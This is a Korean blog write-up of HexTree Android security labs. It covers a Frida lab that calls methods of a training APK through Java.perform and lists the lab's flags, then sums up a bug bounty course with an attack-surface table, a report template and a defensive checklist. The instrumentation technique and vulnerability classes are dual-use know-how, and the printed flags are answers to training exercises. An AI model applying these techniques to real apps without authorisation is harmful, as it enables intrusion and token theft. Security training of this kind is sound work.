**Lab:** [정적·동적 분석 결합과 Java.perform (Mixing Static and Dynamic Analysis & Java.perform)](https://app.hextree.io/courses/android-dynamic-instrumentation/frida-basics-q9/mixing-static-and-dynamic-analysis-javap)

#### 대상 및 정적 분석

랩의 setup material은 `FridaTarget.apk`를 제공한다. Manifest에서 확인한 package는 `io.hextree.fridatarget`다. 디코드된 APK의 `FlagClass`는 다음 세 메서드를 제공한다.

```java
static String flagFromStaticMethod()
String flagFromInstanceMethod()
String flagIfYouCallMeWithSesame(String password)
```

각 메서드는 encoded string을 `FlagCryptor.decodeFlag`에 넘긴다. helper를 분석하면 변환 방식은 Base64 decode 후 ROT13임을 알 수 있다. 마지막 메서드는 argument를 대소문자 구분 없이 `sesame`과 비교한다. 이 정적 분석으로 호출할 메서드와 보호된 메서드에 필요한 argument를 모두 확인했다.

#### Frida 호출

동일한 runtime 검증은 Java VM이 준비된 뒤 수행할 수 있다. `Java.perform`은 runtime attach 이후에만 Java bridge가 class에 접근하도록 하므로 필요하다.

```javascript
Java.perform(function () {
  const FlagClass = Java.use('io.hextree.fridatarget.FlagClass');

  console.log(FlagClass.flagFromStaticMethod());

  const instance = FlagClass.$new();
  console.log(instance.flagFromInstanceMethod());
  console.log(instance.flagIfYouCallMeWithSesame('sesame'));
});
```

#### 결과

| 메서드 | 필요한 입력 | 플래그 |
| --- | --- | --- |
| `flagFromStaticMethod()` | 없음 | `HXT{a-static-calling-with-frida}` |
| `flagFromInstanceMethod()` | 없음 | `HXT{dynamic-droid}` |
| `flagIfYouCallMeWithSesame()` | `sesame` | `HXT{the-droid-youre-looking-for}` |

위 값은 APK의 `FlagCryptor` Base64·ROT13 구현을 통해 독립적으로 재현했다. Frida snippet은 runtime에서 같은 메서드 경로를 호출한다.

#### 배운 점

정적 분석은 instrumentation 전에 중요한 두 질문, 즉 어떤 class/method가 중요한지와 어떤 type 또는 argument를 요구하는지를 답해 준다. Frida는 발견한 메서드를 앱의 runtime 안에서 호출하므로 복잡한 business logic을 재구현하지 않아도 된다. 두 방식은 서로 대체 관계가 아니며, 정적 분석이 동적 script를 집중적이고 신뢰성 있게 만든다.

### 참고 자료

- [HexTree 랩: 정적·동적 분석 결합과 Java.perform](https://app.hextree.io/courses/android-dynamic-instrumentation/frida-basics-q9/mixing-static-and-dynamic-analysis-javap)
- [HexTree setup: Frida를 이용한 APK 수정](https://app.hextree.io/courses/android-dynamic-instrumentation/setup/patching-apks-with-frida)
- [Frida JavaScript API: `Java.perform`](https://frida.re/docs/javascript-api/#javaperformfn)


---

## HexTree Android Track — Android Bug Bounty

### 요약

`Android Bug Bounty` 과정은 앞에서 실습한 개별 취약점들을 실제 제보 관점으로 정리하는 단계로 볼 수 있다. 단일 flag를 얻는 것보다 중요한 포인트는 **도달 가능한 공격 표면을 식별하고, 재현 가능한 영향으로 정리하고, 수정 방향까지 제시하는 것**이다.

OWASP MASTG는 모바일 앱 보안 테스트와 리버스 엔지니어링을 위한 포괄적인 가이드이며, MASVS 통제를 검증하기 위한 기술 절차를 설명한다. 이 과정의 write-up은 MASTG식 분류를 기준으로 Android 앱의 취약점 제보 흐름을 정리한다. [OWASP MASTG](https://mas.owasp.org/MASTG/)

### 버그 바운티 관점의 핵심 흐름

Android 앱 취약점 제보는 보통 아래 순서로 정리하는 것이 깔끔하다.

1. **공격 표면 식별**
   - `AndroidManifest.xml`에서 exported Activity, Service, BroadcastReceiver, ContentProvider를 확인한다.
   - Deep Link, App Link, FileProvider, WebView, Bluetooth, storage, permission 사용 지점을 분류한다.

2. **도달 가능성 검증**
   - 외부 앱, 브라우저, ADB, broadcast, content URI, intent extra 등을 통해 실제로 취약 코드에 도달 가능한지 확인한다.
   - 도달 불가능한 코드는 취약해 보여도 제보 가치가 낮다.

3. **영향 증명**
   - 민감 정보 읽기, 권한 우회, 내부 Activity 실행, 파일 덮어쓰기, 인증 흐름 우회, 토큰 탈취처럼 보안 영향이 명확해야 한다.
   - 단순 crash나 UI 이상 동작은 영향이 제한적이면 낮은 심각도로 정리한다.

4. **재현 절차 최소화**
   - 보고서에는 필요한 환경, 앱 버전, 입력값, 명령, 기대 결과, 실제 결과를 짧게 쓴다.
   - PoC는 불필요하게 복잡하게 만들지 않는다.

5. **수정 방향 제시**
   - `android:exported="false"`, permission 보호, explicit intent 사용, URI 검증, WebView 설정 제한, server-side validation 같은 실질적인 방어책을 연결한다.

### 지금까지 학습한 공격 표면과 제보 포인트

| 영역 | 대표 취약점 | Bug bounty 보고서에서 강조할 점 |
|---|---|---|
| Intent / Activity | exported Activity 오용, intent redirect, implicit intent hijack | 외부 앱에서 내부 기능으로 진입 가능한지, 인증/권한 검사를 우회하는지 |
| Deep Link | login token 탈취, scheme hijacking, Chrome intent abuse | 브라우저 또는 다른 앱에서 민감한 flow를 조작할 수 있는지 |
| BroadcastReceiver | spoofed broadcast, ordered broadcast interception | sender 검증 부재, permission 없는 receiver 노출 |
| Service / Bound Service | exported service 호출, Messenger/AIDL 오용 | 클라이언트 검증 없이 privileged action이 실행되는지 |
| ContentProvider | SQL injection, 과도한 provider 노출 | projection/selection/path 조작으로 민감 데이터 접근이 가능한지 |
| FileProvider | path traversal, writable grant abuse | `content://` URI로 내부 파일 읽기/쓰기 가능 여부 |
| WebView | JavaScript bridge, XSS, file access, postMessage origin 검증 부재 | JS 실행이 앱 권한 또는 내부 파일 접근으로 이어지는지 |
| Insecure Storage | SharedPreferences/SQLite/cache/external storage 민감 정보 저장 | 로컬 공격자가 토큰·개인정보를 추출 가능한지 |
| Permissions | custom permission, runtime permission, component permission misconfig | 권한 모델이 실제 보호 경계로 동작하는지 |
| Bluetooth | BLE GATT characteristic read/write/notify 오용 | 인증 없는 characteristic 조작이나 replay 가능한 command가 있는지 |

### 보고서 템플릿

실제 bug bounty 제출용 보고서는 아래 구조로 정리한다.

```markdown
### 제목
외부 앱에서 exported Activity를 통해 인증 없이 내부 기능 실행 가능

### 요약
대상 앱의 exported Activity가 intent extra를 신뢰하여 내부 기능을 실행한다.
공격자는 별도 권한 없이 crafted intent를 보내 민감 동작에 도달할 수 있다.

### 영향받는 컴포넌트
- Package:
- Component:
- App version:
- Android version:

### 재현 절차
1. 대상 앱 설치
2. 공격용 앱 또는 ADB에서 아래 intent 전송
3. 내부 Activity/민감 동작 실행 확인

### 재현 코드(PoC)
adb shell am start ...

### 영향
인증 또는 권한 검사를 거치지 않고 내부 기능이 실행된다.
해당 기능이 토큰, 파일, 결제, 계정 설정과 연결되면 영향도가 상승한다.

### 수정 방안
- 외부 진입이 필요 없으면 `android:exported="false"` 적용
- 외부 진입이 필요하면 signature permission 또는 호출자 검증 적용
- intent extra를 신뢰하지 말고 서버/앱 내부 상태 기준으로 재검증
```

### 심각도 판단 기준

Bug bounty에서 중요한 것은 “취약해 보이는 코드”가 아니라 “실제 영향”이다.

- **High 이상 후보**
  - 계정 탈취, 인증 우회, 민감 파일/토큰 탈취, 원격 코드 실행에 준하는 WebView JS bridge 악용
- **Medium 후보**
  - 특정 조건에서 내부 기능 접근, 권한 없는 데이터 조회, limited file read/write
- **Low 후보**
  - 민감 영향이 약한 crash, 정보 노출 범위가 제한된 디버그 정보, exploit 조건이 과도한 취약점

이는 추정 기준이다. 실제 등급은 프로그램의 scope, reward policy, 사용자 영향, 재현 안정성에 따라 달라진다.

### Android 보안 관점의 방어 체크리스트

- 외부에 공개할 필요 없는 컴포넌트는 exported 하지 않는다.
- 공개 컴포넌트는 caller, permission, input validation을 모두 확인한다.
- implicit intent로 민감 정보를 보내지 않는다.
- Deep Link는 scheme/host/path뿐 아니라 상태값, nonce, redirect target까지 검증한다.
- ContentProvider는 최소 권한과 parameter binding을 적용한다.
- FileProvider는 root-path 같은 넓은 경로를 피하고 필요한 파일만 공유한다.
- WebView는 신뢰되지 않은 콘텐츠에서 JavaScript bridge를 노출하지 않는다.
- 로컬 저장소에는 장기 토큰과 민감 정보를 평문으로 남기지 않는다.
- 네트워크 보안은 Network Security Configuration으로 cleartext, trust anchor, pinning 정책을 명시적으로 관리한다. Android 공식 문서는 이 설정으로 cleartext traffic opt-out, trust anchor 제한, certificate pinning 등을 구성할 수 있다고 설명한다. [Android Developers: Network Security Configuration](https://developer.android.com/privacy-and-security/security-config)

### 정리

이 트랙까지 완료하면서 Android 앱 제보의 기본 골격이 정리됐다.

- Manifest에서 공격 표면을 찾는다.
- Intent, URI, storage, WebView, provider, service, receiver, permission, Bluetooth 흐름을 각각 신뢰 경계로 본다.
- 취약점은 “원인 → 재현 → 영향 → 수정” 순서로 설명한다.
- 블로그 write-up에서는 flag 자체보다 분석 경로와 재현 근거를 중심으로 작성한다.

### 참고 자료

1. [HexTree: Android Bug Bounty](https://app.hextree.io/courses/android-bugbounty)
2. [OWASP MASTG](https://mas.owasp.org/MASTG/)
3. [OWASP MASTG Tests](https://mas.owasp.org/MASTG/tests/)
4. [Android Developers: Network Security Configuration](https://developer.android.com/privacy-and-security/security-config)

## 완료 증적

![HexTree Android Track 14 of 14 완료 화면](assets/hextree-android-track-14-of-14.png)

> 그림 3. HexTree Android Map에서 확인한 14/14 과정 완료 화면
